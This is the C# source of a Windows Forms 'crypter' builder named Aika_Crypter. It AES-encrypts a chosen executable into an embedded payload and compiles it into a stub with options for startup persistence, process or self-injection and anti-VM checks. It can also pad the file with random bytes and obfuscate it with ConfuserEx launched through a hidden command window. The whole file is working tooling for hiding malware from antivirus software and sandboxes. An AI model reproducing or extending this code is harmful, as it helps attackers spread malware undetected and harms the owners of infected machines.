using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
#pragma warning disable 0169
#pragma warning disable 0649
namespace Aika_Crypter
{
    public partial class Form1 : Form
    {
        static byte[] encFile;
        string ico;

        public Form1()
        {
            InitializeComponent();
        }
         
        private static byte[] EncryptAES(byte[] bytesToBeEncrypted, string password)
        {
            byte[] result = null;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
                {
                    rijndaelManaged.KeySize = 256;
                    rijndaelManaged.BlockSize = 128;
                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(password), 1000);
                    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                    rijndaelManaged.Mode = CipherMode.CBC;
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cryptoStream.Close();
                    }
                    result = memoryStream.ToArray();
                }
            }
            return result;
        }

        private static string Pump()
        {
            Random rnd = new Random();
            int size = rnd.Next(1000, 1000000);
            byte[] gen = new byte[size];
            rnd.NextBytes(gen);
            string filename = "Garbage.bin";
            File.WriteAllBytes(filename, gen);
            return filename;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            //Crypt
            string result = Properties.Resources.stub;
            result = result.Replace("%startup%", startup.Checked.ToString().ToLower());
            result = result.Replace("%native%", native.Checked.ToString().ToLower());
            result = result.Replace("%selfinj%", si.Checked.ToString().ToLower());
            result = result.Replace("%antivm%", antivm.Checked.ToString().ToLower());
            result = result.Replace("%key%", key.Text);
            result = result.Replace("%asm%", GenerateKey());
            var providerOptions = new Dictionary<string, string>
            {
                {"CompilerVersion", "v4.0"}
            };
            CompilerResults results;
            using (var provider = new CSharpCodeProvider(providerOptions))
            {
                var Params = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll" }, Environment.GetEnvironmentVariable("temp") + "\\Crypted.exe", true);
                if (ico !=  null)
                    Params.CompilerOptions = "/t:winexe /unsafe /platform:x86 /win32icon:\"" + ico + "\"";
                else
                    Params.CompilerOptions = "/t:winexe /unsafe /platform:x86";

                Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                Params.ReferencedAssemblies.Add("System.dll");
                Params.ReferencedAssemblies.Add("System.Drawing.Dll");
                Params.ReferencedAssemblies.Add("System.Security.Dll");
                Params.ReferencedAssemblies.Add("System.Management.dll");

                string fname = "";
                if (punp.Checked)
                {
                    fname = Pump();
                    Params.EmbeddedResources.Add(fname); 
                }
                
                string tmp = "payload";
                File.WriteAllBytes(tmp, EncryptAES(encFile, key.Text));
                Params.EmbeddedResources.Add(tmp);
                results = provider.CompileAssemblyFromSource(Params, result);
                try
                {
                    File.Delete(tmp);
                    File.Delete(fname);
                }
                catch(Exception)
                {

                } 
            }
            if (results.Errors.Count == 0)
            {
                String temp = Environment.GetEnvironmentVariable("temp");
                if (obf.Checked)
                {
                   
                    File.WriteAllBytes(temp + "\\cli.exe", Properties.Resources.cli);
                    File.WriteAllBytes(temp + "\\Confuser.Core.dll", Properties.Resources.Confuser_Core);
                    File.WriteAllBytes(temp + "\\Confuser.DynCipher.dll", Properties.Resources.Confuser_DynCipher);
                    File.WriteAllBytes(temp + "\\Confuser.Protections.dll", Properties.Resources.Confuser_Protections);
                    File.WriteAllBytes(temp + "\\Confuser.Renamer.dll", Properties.Resources.Confuser_Renamer);
                    File.WriteAllBytes(temp + "\\Confuser.Runtime.dll", Properties.Resources.Confuser_Runtime);
                    File.WriteAllBytes(temp + "\\dnlib.dll", Properties.Resources.dnlib);

                    String crproj = Properties.Resources.def.Replace("%out%", Environment.CurrentDirectory);
                    crproj = crproj.Replace("%base%", temp);
                    crproj = crproj.Replace("%file%", temp + "\\Crypted.exe");
                    File.WriteAllText(temp + "\\def.crproj", crproj);

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.Arguments = "/C " + temp + "\\cli.exe " + temp + "\\def.crproj";
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.CreateNoWindow = true;
                    startInfo.FileName = "cmd.exe";
                    Thread pr = new Thread(() => Process.Start(startInfo));
                    pr.Start();
                    pr.Join();
                }
                else
                {
                    String file = Environment.CurrentDirectory + "\\Crypted.exe";
                    try
                    {
                        File.Delete(file);
                    }
                    catch(Exception)
                    {

                    }
                    File.Move(temp + "\\Crypted.exe", file);
                }
                    

                MessageBox.Show("Done! Check Crypted.exe in the same folder.", "Crypting", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            
            foreach (CompilerError compilerError in results.Errors)
            {
                MessageBox.Show(string.Format("Error: {0}, At line {1}", compilerError.ErrorText, compilerError.Line));
            }
            
            
                
        }


        private void button2_Click(object sender, EventArgs e)
        {
            //choose file
            int size = -1;
            DialogResult result = openFileDialog1.ShowDialog(); 
            if (result == DialogResult.OK) 
            {
                string file = openFileDialog1.FileName;
                try
                {
                    byte[] bytes = File.ReadAllBytes(file);
                    size = bytes.Length;
                    encFile = bytes;
                    fpath.Text = file;
                }
                catch (IOException exc)
                {
                    MessageBox.Show(exc.ToString());
                }
            }
        }

        public string GenerateKey()
        {
            string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890";
            string result = "";
            Random rnd = new Random();
            int iter = rnd.Next(5, abc.Length);
            for (int i = 0; i < iter; i++)
                result += abc[rnd.Next(0, abc.Length)];
            return result;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //generate key            
            key.Text = GenerateKey();
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            //startup
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            //obfuscate
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            //pump
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {
            //anti vm
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            //native
            
            if (pi.Enabled)
            {
                pi.Checked = false;
                pi.Enabled = false;
            }
            else
                pi.Enabled = true;
            managed.Checked = !native.Checked;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            //process injection
            si.Checked = !pi.Checked;
        }

        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            //Managed
            native.Checked = !managed.Checked;
            pi.Checked = false;
        }

        private void si_CheckedChanged(object sender, EventArgs e)
        {
            //self inj
            pi.Checked = !si.Checked;
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            //icon
            DialogResult result = openFileDialog1.ShowDialog();
            if (result == DialogResult.OK)
            {
                ico = openFileDialog1.FileName;
                icopath.Text = ico;
            }
                
            else
                MessageBox.Show("Error. Choose another icon.");
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
